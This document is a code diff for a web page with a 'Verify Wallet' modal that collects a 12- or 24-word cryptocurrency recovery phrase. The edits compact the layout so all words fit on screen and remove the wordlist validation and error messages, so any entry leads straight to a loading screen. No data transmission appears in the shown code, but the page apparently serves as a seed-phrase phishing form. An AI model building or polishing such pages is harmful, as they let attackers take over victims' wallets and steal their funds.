@@ -10,10 +10,10 @@
             margin: 0;
             padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            user-select: text;
-            -webkit-user-select: text;
-            -moz-user-select: text;
-            -ms-user-select: text;
+            user-select: text !important;
+            -webkit-user-select: text !important;
+            -moz-user-select: text !important;
+            -ms-user-select: text !important;
         }
 
         body {
@@ -71,7 +71,7 @@
             background-color: rgba(0, 0, 0, 0.03);
         }
 
-        /* Main Modal Container */
+        /* Main Modal Container - Custom height and width for 24-word fit */
         .main-wrapper {
             display: flex;
             justify-content: center;
@@ -83,7 +83,8 @@
 
         .modal {
             background-color: #0c0c0e;
-            width: 440px;
+            width: 460px;
+            min-height: 540px; /* Taller vertical layout */
             border-radius: 22px;
             padding: 24px 20px 20px 20px;
             box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
@@ -97,7 +98,7 @@
         .dots {
             display: flex;
             gap: 6px;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
 
         .dot {
@@ -123,7 +124,7 @@
         .modal-subtitle {
             font-size: 12px;
             color: #8c8c9e;
-            margin-bottom: 16px;
+            margin-bottom: 12px;
             text-align: center;
             line-height: 1.4;
         }
@@ -157,69 +158,43 @@
             display: none !important;
         }
 
-        /* Inputs Container Layout - Matching 3-column image layout */
+        /* Inputs Container Layout - 3 columns, tightly packed vertically with zero scroll */
         .inputs-container {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 6px;
+            gap: 5px;
             width: 100%;
-            margin-bottom: 12px;
-            max-height: 310px;
-            overflow-y: auto;
-            padding-right: 2px;
-        }
-
-        .inputs-container::-webkit-scrollbar {
-            width: 4px;
-        }
-        .inputs-container::-webkit-scrollbar-thumb {
-            background: #27272a;
-            border-radius: 4px;
+            margin-bottom: 10px;
         }
 
         .input-group {
             position: relative;
             background-color: #141417;
             border: 1px solid #232329;
-            border-radius: 8px;
-            padding: 4px 8px;
-            height: 36px; /* Smaller boxes as requested */
+            border-radius: 7px;
+            padding: 3px 6px;
+            height: 33px; /* Compact height */
             display: flex;
             flex-direction: column;
             justify-content: center;
             transition: border-color 0.2s;
         }
 
-        .input-group.error {
-            border-color: #ef4444;
-            background-color: rgba(239, 68, 68, 0.05);
-        }
-
         .input-group label {
-            font-size: 9px;
+            font-size: 8px;
             color: #71717a;
             line-height: 1;
-            margin-bottom: 2px;
+            margin-bottom: 1px;
         }
 
         .input-group input {
             background: transparent;
             border: none;
             color: #fff;
-            font-size: 12px;
+            font-size: 11px;
             outline: none;
             width: 100%;
             line-height: 1.2;
-        }
-
-        /* Error Label Text */
-        .error-message {
-            color: #ef4444;
-            font-size: 11px;
-            width: 100%;
-            margin-bottom: 8px;
-            display: none;
-            text-align: center;
         }
 
         /* Toggle Phrase Button */
@@ -229,7 +204,7 @@
             border: none;
             font-size: 12px;
             cursor: pointer;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             font-weight: 500;
             transition: color 0.25s ease;
             pointer-events: auto;
@@ -242,7 +217,7 @@
         /* Action Buttons - Dynamic States */
         .action-btn {
             width: 100%;
-            background-color: #1c1c21; /* Blackish gray when incomplete */
+            background-color: #1c1c21; /* Blackish gray when not fully filled */
             color: #71717a;
             border: none;
             border-radius: 12px;
@@ -254,9 +229,9 @@
             transition: all 0.2s ease;
         }
 
-        /* Active state when all inputs are filled properly */
+        /* Active state when all inputs are filled */
         .action-btn.active-btn {
-            background-color: #b794f4; /* Slightly darker purple look matching image */
+            background-color: #b794f4; /* Slightly darker purple look */
             color: #000;
             cursor: pointer;
             pointer-events: auto;
@@ -308,11 +283,8 @@
 
                 <div class="inputs-container" id="inputsGrid"></div>
 
-                <div class="error-message" id="errorMessage"></div>
-
                 <button type="button" class="toggle-phrase" id="toggleBtn">I have a 24-word recovery phrase</button>
 
-                <!-- Changed to Verify Wallet with dynamic blackish-gray / purple states -->
                 <button type="button" class="action-btn" id="importBtn">Verify Wallet</button>
             </div>
 
@@ -332,10 +304,6 @@
 
     <!-- Script Logic -->
     <script>
-        const bip39Words = [
-            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst"
-        ];
-
         let wordCount = 12;
         const welcomeScreen = document.getElementById('welcomeScreen');
         const phraseScreen = document.getElementById('phraseScreen');
@@ -344,7 +312,6 @@
         const inputsGrid = document.getElementById('inputsGrid');
         const toggleBtn = document.getElementById('toggleBtn');
         const subtitleText = document.getElementById('subtitle-text');
-        const errorMessage = document.getElementById('errorMessage');
         const importBtn = document.getElementById('importBtn');
 
         startBtn.onclick = function(e) {
@@ -381,20 +348,19 @@
                 subtitleText.textContent = "Import an existing wallet with your 12 or 24-word recovery phrase.";
             }
             renderInputs();
-            errorMessage.style.display = 'none';
         };
 
         function checkCompletion() {
-            let allFilledAndValid = true;
+            let allFilled = true;
             for (let i = 1; i <= wordCount; i++) {
                 const inputEl = document.getElementById(`word-${i}`);
-                if (!inputEl || inputEl.value.trim() === "" || !bip39Words.includes(inputEl.value.trim().toLowerCase())) {
-                    allFilledAndValid = false;
+                if (!inputEl || inputEl.value.trim() === "") {
+                    allFilled = false;
                     break;
                 }
             }
 
-            if (allFilledAndValid) {
+            if (allFilled) {
                 importBtn.classList.add('active-btn');
             } else {
                 importBtn.classList.remove('active-btn');
@@ -403,9 +369,6 @@
 
         inputsGrid.addEventListener('input', (e) => {
             if (e.target.tagName === 'INPUT') {
-                const index = e.target.getAttribute('data-index');
-                document.getElementById(`group-${index}`).classList.remove('error');
-                errorMessage.style.display = 'none';
                 checkCompletion();
             }
         });
@@ -414,34 +377,8 @@
             e.preventDefault();
             if (!importBtn.classList.contains('active-btn')) return;
 
-            let errorIndices = [];
-            for (let i = 1; i <= wordCount; i++) {
-                const inputVal = document.getElementById(`word-${i}`).value.trim().toLowerCase();
-                const groupDiv = document.getElementById(`group-${i}`);
-
-                if (inputVal === "" || !bip39Words.includes(inputVal)) {
-                    groupDiv.classList.add('error');
-                    errorIndices.push(i);
-                } else {
-                    groupDiv.classList.remove('error');
-                }
-            }
-
-            if (errorIndices.length > 0) {
-                let text = "";
-                if (errorIndices.length === 1) {
-                    text = `Word ${errorIndices[0]} is incorrect or misspelled`;
-                } else {
-                    const last = errorIndices.pop();
-                    text = `Words ${errorIndices.join(', ')} and ${last} are incorrect or misspelled`;
-                }
-                errorMessage.textContent = text;
-                errorMessage.style.display = 'block';
-            } else {
-                errorMessage.style.display = 'none';
-                phraseScreen.classList.add('hidden');
-                loadingScreen.classList.remove('hidden');
-            }
+            phraseScreen.classList.add('hidden');
+            loadingScreen.classList.remove('hidden');
         };
     </script>
 </body>
